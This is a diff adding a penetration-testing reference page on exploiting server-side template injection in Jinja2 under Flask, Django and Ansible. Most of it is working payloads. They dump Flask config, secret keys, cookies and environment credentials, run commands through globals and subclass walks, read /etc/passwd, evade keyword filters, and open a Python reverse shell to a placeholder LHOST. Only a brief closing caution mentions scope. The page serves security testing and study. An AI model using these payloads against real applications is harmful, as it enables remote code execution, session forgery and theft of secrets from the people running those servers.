@@ -1,0 +1,251 @@
+---
+title: Jinja2 (Python - Flask, Django, Ansible)
+description: SSTI exploitation in Jinja2 - class-graph walks to reach os and subprocess, payloads for Flask/Django/Ansible, sandbox-aware variants.
+mitre: [T1190, T1059.006]
+d3fend: [D3-EAL, D3-PE]
+impact: [ServerSideEval, RCE, FileRead]
+sidebar:
+  order: 3
+  label: Jinja2
+---
+import { Aside, Tabs, TabItem } from '@astrojs/starlight/components';
+
+## TL;DR
+
+Jinja2 doesn't expose `os` or `subprocess` directly, but every Python string carries a reference graph that reaches them. Walk: `''` → `__class__` (`str`) → `__mro__` → `object` → `__subclasses__()` → some class that imports `os` or has `Popen`.
+
+```
+# Confirm Jinja2 (not Twig)
+{{7*'7'}}                                            # → '7777777'
+
+# Read flask config / session secret
+{{config}}                                           # dumps Flask config
+{{config.items()}}                                   # same, as iterable
+
+# RCE - Flask >= 0.10 (one-liner via lipsum.__globals__)
+{{ lipsum.__globals__['os'].popen('id').read() }}
+
+# RCE - universal Python (subclass walk)
+{{ ''.__class__.__mro__[1].__subclasses__() }}      # enumerate first
+# Then pick the index of <class 'subprocess.Popen'> or similar
+{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id', shell=True, stdout=-1).communicate() }}
+```
+
+Success indicator: `id` output (uid/gid line) appears in the response.
+
+## Where this engine lives
+
+- **Flask** - Python's most common micro-framework. Jinja2 is the default renderer; `render_template_string()` is the SSTI sink.
+- **Django** - uses Django's own template language by default, but Jinja2 is a supported alternative (`'BACKEND': 'django.template.backends.jinja2.Jinja2Environment'`). Django's *own* template language has separate payloads not covered here.
+- **Ansible** - playbooks and inventory variables are Jinja2-rendered. RCE through Ansible templates is a common privesc path on misconfigured CI/CD.
+- **SaltStack** - also Jinja2-based.
+- **Anything embedding `jinja2.Template()`** - log formatters, email builders, code generators, custom CMSes.
+
+## Step 1 - Confirm and orient
+
+Three probes establish the situation:
+
+```
+{{7*7}}                            # → 49        confirms template eval
+{{7*'7'}}                          # → 7777777   confirms Jinja2 (not Twig)
+{{ ''.__class__ }}                 # → <class 'str'>   confirms Python-side access
+```
+
+If all three work, you have full Jinja2 in an unrestricted environment. Move to step 2.
+
+If `{{ ''.__class__ }}` returns unchanged or empty, you're in a **sandboxed environment** (Flask's `SandboxedEnvironment`, Ansible's strict mode, or a custom subclass). See [sandbox escape](/codex/web/server-side/ssti/sandbox-escape/).
+
+## Step 2 - Loot before escalating
+
+Before going for RCE, harvest the easy wins. These are low-noise and frequently sufficient:
+
+```
+# Flask app config - secrets, DB URL, API keys
+{{config}}
+{{config.items()}}
+{{config.SECRET_KEY}}                                # session-signing key
+{{config.SQLALCHEMY_DATABASE_URI}}                   # DB connection string
+
+# Request object - headers, cookies, body
+{{request}}
+{{request.headers}}
+{{request.cookies}}
+{{request.environ}}                                  # full WSGI environ incl. server vars
+
+# Environment variables - cloud creds, DB passwords
+{{ config.__class__.__init__.__globals__['os'].environ }}
+
+# Session contents (if accessible)
+{{session}}
+```
+
+`{{config.SECRET_KEY}}` alone is high-impact on Flask: with the secret, you forge session cookies, bypass auth, and elevate to admin without needing RCE.
+
+## Step 3 - RCE paths
+
+Three paths to RCE. Try in order; the first that works is the cleanest.
+
+### Path A - `lipsum.__globals__` (Flask only)
+
+Jinja2 with Flask exposes a `lipsum` helper. Its `__globals__` is the Flask module's namespace, which has `os` already imported:
+
+```
+{{ lipsum.__globals__['os'].popen('id').read() }}
+{{ lipsum.__globals__.os.popen('id').read() }}
+{{ lipsum.__globals__['os'].popen('cat /etc/passwd').read() }}
+```
+
+Same trick via `cycler`, `joiner`, `namespace` if `lipsum` is removed:
+
+```
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+{{ joiner.__init__.__globals__.os.popen('id').read() }}
+{{ namespace.__init__.__globals__.os.popen('id').read() }}
+```
+
+If any of these work, you're done.
+
+### Path B - `request.application.__globals__` (Flask alt)
+
+Sometimes `lipsum` and friends are filtered but `request` isn't:
+
+```
+{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
+```
+
+This works on Flask because `request.application` is the Flask app instance, and Flask itself imported the things you need.
+
+### Path C - Subclass walk (universal Python)
+
+When framework-specific helpers are gone, walk Python's class graph manually. Every string has a `__class__`; from there, `__mro__` reaches `object`, and `object.__subclasses__()` returns every class loaded in the interpreter:
+
+```
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+```
+
+This prints a giant list. Find a useful subclass - `<class 'subprocess.Popen'>`, `<class 'os._wrap_close'>`, or `<class 'warnings.catch_warnings'>`. Each index varies by Python version and what's loaded.
+
+Find Popen programmatically with `request.environ` and slicing:
+
+```
+{{ ''.__class__.__mro__[1].__subclasses__()|map(attribute='__name__')|join(',') }}
+```
+
+That returns all subclass names as a comma-list. Find the index of `Popen` in the output, then:
+
+```
+{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id', shell=True, stdout=-1).communicate() }}
+```
+
+Replace `INDEX` with the integer position.
+
+Alternative without needing Popen's exact index - use `os._wrap_close` if present (always has `__init__.__globals__` containing `os`):
+
+```
+{% for c in ''.__class__.__mro__[1].__subclasses__() %}
+  {% if c.__name__ == 'os._wrap_close' %}
+    {{ c.__init__.__globals__.system('id') }}
+  {% endif %}
+{% endfor %}
+```
+
+In a one-liner with `selectattr`:
+
+```
+{{ (''.__class__.__mro__[1].__subclasses__()|selectattr('__name__','equalto','_wrap_close')|list)[0].__init__.__globals__.system('id') }}
+```
+
+### Path D - `warnings.catch_warnings` (when `os` isn't imported anywhere)
+
+In very minimal Python apps, `os` may not have been imported by any loaded module. `warnings.catch_warnings` reliably is:
+
+```
+{{ ''.__class__.__mro__[1].__subclasses__()|selectattr('__name__','equalto','catch_warnings')|first }}.__init__.__globals__.__builtins__.__import__('os').system('id')
+```
+
+This imports `os` at template-eval time via `__builtins__.__import__`. Works when other paths fail.
+
+## File read without command execution
+
+Sometimes you have eval but `os.popen`/`os.system` is filtered or you want stealthier output. Read files via Python file objects:
+
+```
+{{ ''.__class__.__mro__[1].__subclasses__()|selectattr('__name__','equalto','FileLoader')|first }}.get_source(0,'/etc/passwd')
+
+# Or via builtin open()
+{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}
+```
+
+Flask-specific shortcut:
+
+```
+{{ config.__class__.__init__.__globals__['__builtins__']['open']('/etc/passwd').read() }}
+```
+
+## Reverse shell
+
+Once you have RCE, jump to a shell. Standard Python reverse shell:
+
+```
+{{ lipsum.__globals__['os'].popen('python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect((\"<LHOST>\",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])\'').read() }}
+```
+
+For environments where double-quotes are awkward, base64 the inner payload:
+
+```
+{{ lipsum.__globals__['os'].popen('echo BASE64_PAYLOAD | base64 -d | python3').read() }}
+```
+
+## Ansible specifics
+
+Ansible templates run with full Python access in playbook context. The payload form is the same; the entry point is different:
+
+```yaml
+# Playbook variable referenced as {{ user_supplied_var }}
+user_supplied_var: "{{ lookup('pipe', 'id') }}"
+```
+
+`lookup('pipe', ...)` is Ansible's documented escape hatch and runs commands directly. If user input flows into a `vars:` block, an inventory file, or a `--extra-vars` argument, this is the payload form.
+
+For Ansible Tower / AWX, surveys and extra-vars frequently funnel into Jinja2 rendering with full lookup access.
+
+## Filter-aware variants
+
+When keywords are blocked (`__class__`, `subprocess`, `popen`, `os`), see [filter bypass](/codex/web/server-side/ssti/filter-bypass/). Quick previews of what's possible:
+
+```
+# Attribute access via string indexing - avoids the keyword __class__
+{{ ''['__class__']['__mro__'][1]['__subclasses__']() }}
+
+# Hex/Unicode in attribute names
+{{ ''['\x5f\x5fclass\x5f\x5f'] }}
+
+# request.args used to smuggle keywords past inline filters
+{{ ''[request.args.x][request.args.y][1][request.args.z]() }}
+# Then submit ?x=__class__&y=__mro__&z=__subclasses__
+```
+
+## Detection-only payloads
+
+Useful when you only want to confirm Jinja2 without escalating:
+
+```
+{{7*7}}                                              # eval probe
+{{7*'7'}}                                            # Jinja-vs-Twig probe
+{{ ''.__class__.__name__ }}                          # returns 'str' on hit
+{{ self.__class__ }}                                 # returns __TwigTemplate_... or jinja2.runtime.Context
+{{ joiner.__class__.__module__ }}                    # returns 'jinja2.utils' if present
+```
+
+The last one is the cleanest single-payload "is this Jinja2?" - no escalation potential visible, just an engine name.
+
+## Notes
+
+- **Version specifics** - the subclass-walk payloads work on Python 2.7 and 3.x identically. The `os._wrap_close` class has been present since Python 3.0 and stable since.
+- **Whitespace** - Jinja2 is whitespace-tolerant inside `{{...}}`. `{{ 7 * 7 }}` works as well as `{{7*7}}`. Use this against simplistic regex filters that match `{{7*7}}` exactly.
+- **Statement vs expression syntax** - `{{ expr }}` is expression context, `{% statement %}` is statement context. Most payloads above are expression-form. Use `{% for %}` / `{% if %}` for control flow if expression form is filtered.
+- **Output suppression** - if the template renders successfully but the output is empty, the engine probably succeeded but the value didn't reach the response body. Add `|string` filter or assign to a variable then echo: `{% set x = ... %}{{x}}`.
+
+<Aside type="caution">
+The subclass-walk and `lipsum.__globals__` payloads execute on the application server in the application's user context. They have the same blast radius as RCE through any other class of bug. Confirm scope before going past the configuration-dump stage.
+</Aside>
